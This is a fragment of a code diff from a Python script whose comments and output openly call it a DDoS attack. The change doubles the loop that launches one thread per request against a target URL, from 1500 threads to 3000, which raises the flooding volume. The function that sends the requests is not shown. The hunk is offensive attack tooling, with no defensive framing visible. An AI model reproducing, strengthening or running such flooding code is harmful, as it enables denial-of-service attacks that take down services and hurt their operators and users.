@@ -21,7 +21,7 @@ def main():
 
     # Start the DDoS attack
     print("Starting DDoS attack...")
-    for _ in range(1500):
+    for _ in range(3000):
         # Create a new thread for each request
         thread = threading.Thread(target=send_request, args=(target_url,))
         thread.start()
